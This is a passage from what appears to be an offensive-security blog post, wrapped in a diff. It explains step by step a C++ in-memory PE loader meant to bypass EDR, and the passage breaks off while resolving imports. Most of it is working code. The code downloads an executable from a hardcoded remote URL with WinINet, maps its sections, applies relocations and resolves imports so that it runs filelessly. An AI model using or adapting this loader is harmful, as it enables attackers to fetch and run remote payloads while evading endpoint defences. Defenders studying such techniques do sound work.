+    <span class="n">HINTERNET</span> <span class="n">hInternet</span> <span class="o">=</span> <span class="n">InternetOpenA</span><span class="p">(</span><span class="n">agent</span><span class="p">,</span> <span class="n">INTERNET_OPEN_TYPE_DIRECT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hInternet</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"InternetOpenA failed: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// ---- Open URL ----</span>
+    <span class="n">HINTERNET</span> <span class="n">hUrl</span> <span class="o">=</span> <span class="n">InternetOpenUrlA</span><span class="p">(</span><span class="n">hInternet</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">INTERNET_FLAG_NO_CACHE_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hUrl</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"InternetOpenUrlA failed: "</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+        <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// ---- Read PE Executable into memory ----</span>
+    <span class="c1">//std::vector&lt;char&gt; data;</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">BYTE</span><span class="o">&gt;</span> <span class="n">fileBuffer</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">chunk</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">bytesRead</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">InternetReadFile</span><span class="p">(</span><span class="n">hUrl</span><span class="p">,</span> <span class="n">chunk</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">chunk</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">bytesRead</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">bytesRead</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fileBuffer</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">fileBuffer</span><span class="p">.</span><span class="n">end</span><span class="p">(),</span> <span class="n">chunk</span><span class="p">,</span> <span class="n">chunk</span> <span class="o">+</span> <span class="n">bytesRead</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hUrl</span><span class="p">);</span>
+    <span class="n">InternetCloseHandle</span><span class="p">(</span><span class="n">hInternet</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">fileBuffer</span><span class="p">.</span><span class="n">empty</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[-] Failed to download data.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>The code begins with us leveraging the Windows Internet API (Wininet) library to download our PE file (<code class="language-plaintext highlighter-rouge">putty.exe</code>) from my hardcoded URL (https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/putty.exe), to memory.</p>
+
+<ul>
+  <li><strong>InternetOpenA</strong>: Initializes an internet session with a user-agent string (Mozilla/5.0).</li>
+  <li><strong>InternetOpenUrlA</strong>: Opens the specified URL to retrieve the file.</li>
+  <li><strong>InternetReadFile</strong>: Reads the file in chunks (4096 bytes at a time) and stores the data in a std::vector<byte> called fileBuffer.</byte></li>
+</ul>
+
+<p><strong>Note</strong>: I included some commented-out code which demonstrates an alternative method to read the PE file from disk using CreateFileA and ReadFile, but the active code uses the URL-based download approach.</p>
+
+<p>Now the entire PE file is stored in a byte vector called <code class="language-plaintext highlighter-rouge">fileBuffer</code></p>
+
+<h2 id="parsing-the-pe-file-headers"><strong><em>Parsing the PE file headers</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#parsing-the-pe-file-headers" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">fileBuffer</span><span class="p">.</span><span class="n">data</span><span class="p">();</span>
+<span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS64</span><span class="p">)(</span><span class="n">fileBuffer</span><span class="p">.</span><span class="n">data</span><span class="p">()</span> <span class="o">+</span> <span class="n">dosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This section of code reads and interprets the headers of our PE file stored in the <code class="language-plaintext highlighter-rouge">std::vector&lt;BYTE&gt;</code> which we called <code class="language-plaintext highlighter-rouge">fileBuffer</code>, which contains the raw bytes of the PE file we downloaded 😸</p>
+
+<h2 id="allocating-memory-for-the-pe-image"><strong><em>Allocating Memory for the PE Image</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#allocating-memory-for-the-pe-image" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BYTE</span><span class="o">*</span> <span class="n">imageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">imageBase</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] VirtualAlloc failed</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now, we will allocate a block of memory in our process’s address space to hold our PE file’s image (the entire memory layout of the executable).  <code class="language-plaintext highlighter-rouge">BYTE* imageBase</code> will store the base address of the allocated memory, which will serve as the in-memory location of our PE image (putty.exe). 😃</p>
+
+<h2 id="copying-the-pe-headers"><strong><em>Copying the PE Headers</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#copying-the-pe-headers" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">imageBase</span><span class="p">,</span> <span class="n">fileBuffer</span><span class="p">.</span><span class="n">data</span><span class="p">(),</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This step ensures the PE headers (necessary for our PE executable’s structure) are placed at the beginning of the allocated memory, mimicking how the PE would be laid out if loaded by the Windows loader.  In short, we are copying the PE file’s headers from <code class="language-plaintext highlighter-rouge">fileBuffer</code> to the allocated memory at <code class="language-plaintext highlighter-rouge">imageBase</code>.</p>
+
+<p>Also in case you were wondering, <code class="language-plaintext highlighter-rouge">ntHeaders-&gt;OptionalHeader.SizeOfHeaders</code> = The size of the headers to copy, which includes the DOS header, NT headers, and section headers.</p>
+
+<h2 id="mapping-sections"><strong><em>Mapping Sections</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#mapping-sections" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">section</span> <span class="o">=</span> <span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span><span class="n">ntHeaders</span><span class="p">);</span>
+ <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Mapping "</span> <span class="o">&lt;&lt;</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span> <span class="o">&lt;&lt;</span> <span class="s">" sections...</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+ <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">,</span> <span class="o">++</span><span class="n">section</span><span class="p">)</span> <span class="p">{</span>
+     <span class="c1">// Get section name (8 bytes, null-terminated)</span>
+     <span class="kt">char</span> <span class="n">sectionName</span><span class="p">[</span><span class="n">IMAGE_SIZEOF_SHORT_NAME</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+     <span class="n">strncpy_s</span><span class="p">(</span><span class="n">sectionName</span><span class="p">,</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="k">const</span> <span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">section</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">),</span> <span class="n">IMAGE_SIZEOF_SHORT_NAME</span><span class="p">);</span>
+
+     <span class="c1">// Calculate source and destination addresses</span>
+     <span class="n">BYTE</span><span class="o">*</span> <span class="n">dest</span> <span class="o">=</span> <span class="n">imageBase</span> <span class="o">+</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">;</span>
+     <span class="n">BYTE</span><span class="o">*</span> <span class="n">src</span> <span class="o">=</span> <span class="n">fileBuffer</span><span class="p">.</span><span class="n">data</span><span class="p">()</span> <span class="o">+</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span><span class="p">;</span>
+
+     <span class="c1">// Print section details</span>
+     <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Mapping section "</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="s">" ("</span> <span class="o">&lt;&lt;</span> <span class="n">sectionName</span> <span class="o">&lt;&lt;</span> <span class="s">"):</span><span class="se">\n</span><span class="s">"</span>
+         <span class="o">&lt;&lt;</span> <span class="s">"  - Source offset in file: 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">PointerToRawData</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+         <span class="o">&lt;&lt;</span> <span class="s">"  - Destination address: 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uintptr_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">dest</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+         <span class="o">&lt;&lt;</span> <span class="s">"  - Size: "</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span> <span class="o">&lt;&lt;</span> <span class="s">" bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+
+     <span class="c1">// Copy section data</span>
+     <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">section</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span><span class="p">);</span>
+
+     <span class="c1">// Confirm mapping</span>
+     <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Section "</span> <span class="o">&lt;&lt;</span> <span class="n">sectionName</span> <span class="o">&lt;&lt;</span> <span class="s">" mapped successfully.</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>This code snippet maps the sections of our 64-bit PE file using our raw data buffer (<code class="language-plaintext highlighter-rouge">fileBuffer</code>) into allocated memory (<code class="language-plaintext highlighter-rouge">imageBase</code>) to prepare for in-memory execution without writing it to disk. Specifically, we iterate through each section header in the PE file, as defined by the number of sections in the NT headers, and then we will copy each section’s raw data from its file offset (<code class="language-plaintext highlighter-rouge">PointerToRawData</code>) in <code class="language-plaintext highlighter-rouge">fileBuffer</code> to its designated memory location (<code class="language-plaintext highlighter-rouge">imageBase + VirtualAddress</code>) using memcpy. This process ensures our PE file’s sections (e.g., .text for code, .data for initialized data, etc) are laid out in memory according to their virtual addresses, emulating the structure the Windows loader would normally create, which is important for subsequent tasks like resolving imports, applying relocations, and executing the program.</p>
+
+<p>In the screenshot below, you can see what this looks like when we map putty.exe’s sections into memory:</p>
+
+<p><img width="1471" height="608" alt="image" src="https://github.com/user-attachments/assets/e28e3c3d-fd05-417a-8c37-758b1861f3bd"></p>
+
+<h2 id="applying-relocations-if-necessary"><strong><em>Applying Relocations (If Necessary)</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#applying-relocations-if-necessary" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">ULONGLONG</span> <span class="n">delta</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">-</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">);</span>
+ <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">relocDir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="p">];</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">relocDir</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+         <span class="n">BYTE</span><span class="o">*</span> <span class="n">relocBase</span> <span class="o">=</span> <span class="n">imageBase</span> <span class="o">+</span> <span class="n">relocDir</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">;</span>
+         <span class="n">DWORD</span> <span class="n">parsed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+         <span class="k">while</span> <span class="p">(</span><span class="n">parsed</span> <span class="o">&lt;</span> <span class="n">relocDir</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">)</span> <span class="p">{</span>
+             <span class="n">PIMAGE_BASE_RELOCATION</span> <span class="n">relocBlock</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_BASE_RELOCATION</span><span class="p">)(</span><span class="n">relocBase</span> <span class="o">+</span> <span class="n">parsed</span><span class="p">);</span>
+             <span class="n">DWORD</span> <span class="n">blockSize</span> <span class="o">=</span> <span class="n">relocBlock</span><span class="o">-&gt;</span><span class="n">SizeOfBlock</span><span class="p">;</span>
+             <span class="n">DWORD</span> <span class="n">numEntries</span> <span class="o">=</span> <span class="p">(</span><span class="n">blockSize</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_BASE_RELOCATION</span><span class="p">))</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">USHORT</span><span class="p">);</span>
+             <span class="n">USHORT</span><span class="o">*</span> <span class="n">entries</span> <span class="o">=</span> <span class="p">(</span><span class="n">USHORT</span><span class="o">*</span><span class="p">)(</span><span class="n">relocBlock</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+             <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">numEntries</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+                 <span class="n">USHORT</span> <span class="n">typeOffset</span> <span class="o">=</span> <span class="n">entries</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+                 <span class="n">USHORT</span> <span class="n">type</span> <span class="o">=</span> <span class="n">typeOffset</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">;</span>
+                 <span class="n">USHORT</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">typeOffset</span> <span class="o">&amp;</span> <span class="mh">0x0FFF</span><span class="p">;</span>
+
+                 <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">IMAGE_REL_BASED_DIR64</span><span class="p">)</span> <span class="p">{</span>
+                     <span class="n">ULONGLONG</span><span class="o">*</span> <span class="n">patchAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">relocBlock</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+                     <span class="o">*</span><span class="n">patchAddr</span> <span class="o">+=</span> <span class="n">delta</span><span class="p">;</span>
+                 <span class="p">}</span>
+             <span class="p">}</span>
+             <span class="n">parsed</span> <span class="o">+=</span> <span class="n">blockSize</span><span class="p">;</span>
+         <span class="p">}</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+</code></pre></div></div>
+
+<p>This portion of our PE loader code applies base relocations to our PE file loaded into memory at <code class="language-plaintext highlighter-rouge">imageBase</code>, ensuring that it functions correctly if allocated at a different address than its preferred base address (<code class="language-plaintext highlighter-rouge">ntHeaders-&gt;OptionalHeader.ImageBase</code>). We calculate the delta between the actual memory address (<code class="language-plaintext highlighter-rouge">imageBase</code>) and the PE file’s preferred base address. If the delta is non-zero and the PE file contains a relocation table (indicated by <code class="language-plaintext highlighter-rouge">relocDir-&gt;Size &gt; 0</code>), the code processes the relocation directory (<code class="language-plaintext highlighter-rouge">IMAGE_DIRECTORY_ENTRY_BASERELOC</code>). It iterates through relocation blocks, each containing a list of entries specifying offsets and types. For each entry with type <code class="language-plaintext highlighter-rouge">IMAGE_REL_BASED_DIR64</code> (indicating a 64-bit address relocation), it adjusts the memory address at <code class="language-plaintext highlighter-rouge">imageBase + VirtualAddress + offset</code> by adding the delta, effectively updating pointers in the PE image to reflect its actual memory location.</p>
+
+<h2 id="resolving-imports"><strong><em>Resolving Imports</em></strong><a class="header-link" href="https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/#resolving-imports" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">importDir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="p">];</span>
+    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Import directory: VirtualAddress=0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">importDir</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span>
+        <span class="o">&lt;&lt;</span> <span class="s">", Size="</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">importDir</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">&lt;&lt;</span> <span class="s">" bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">importDir</span><span class="o">-&gt;</span><span class="n">Size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">importDesc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">importDir</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">importDesc</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">char</span><span class="o">*</span> <span class="n">dllName</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">importDesc</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">);</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Loading DLL: "</span> <span class="o">&lt;&lt;</span> <span class="n">dllName</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+            <span class="n">HMODULE</span> <span class="n">hModule</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">dllName</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hModule</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"[!] Failed to load "</span> <span class="o">&lt;&lt;</span> <span class="n">dllName</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] DLL "</span> <span class="o">&lt;&lt;</span> <span class="n">dllName</span> <span class="o">&lt;&lt;</span> <span class="s">" loaded successfully at handle 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uintptr_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">hModule</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+
+            <span class="n">PIMAGE_THUNK_DATA64</span> <span class="n">origFirstThunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_THUNK_DATA64</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">importDesc</span><span class="o">-&gt;</span><span class="n">OriginalFirstThunk</span><span class="p">);</span>
+            <span class="n">PIMAGE_THUNK_DATA64</span> <span class="n">firstThunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_THUNK_DATA64</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">importDesc</span><span class="o">-&gt;</span><span class="n">FirstThunk</span><span class="p">);</span>
+
+            <span class="kt">int</span> <span class="n">functionCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">while</span> <span class="p">(</span><span class="n">origFirstThunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">FARPROC</span> <span class="n">proc</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">origFirstThunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span> <span class="o">&amp;</span> <span class="n">IMAGE_ORDINAL_FLAG64</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">WORD</span> <span class="n">ordinal</span> <span class="o">=</span> <span class="n">origFirstThunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">;</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Resolving function by ordinal: #"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">dec</span> <span class="o">&lt;&lt;</span> <span class="n">ordinal</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+                    <span class="n">proc</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">ordinal</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">importByName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">origFirstThunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span><span class="p">);</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Resolving function by name: "</span> <span class="o">&lt;&lt;</span> <span class="n">importByName</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+                    <span class="n">proc</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hModule</span><span class="p">,</span> <span class="n">importByName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[INFO] Function resolved, address: 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uintptr_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
+                        <span class="o">&lt;&lt;</span> <span class="s">", writing to IAT at 0x"</span> <span class="o">&lt;&lt;</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uintptr_t</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">firstThunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
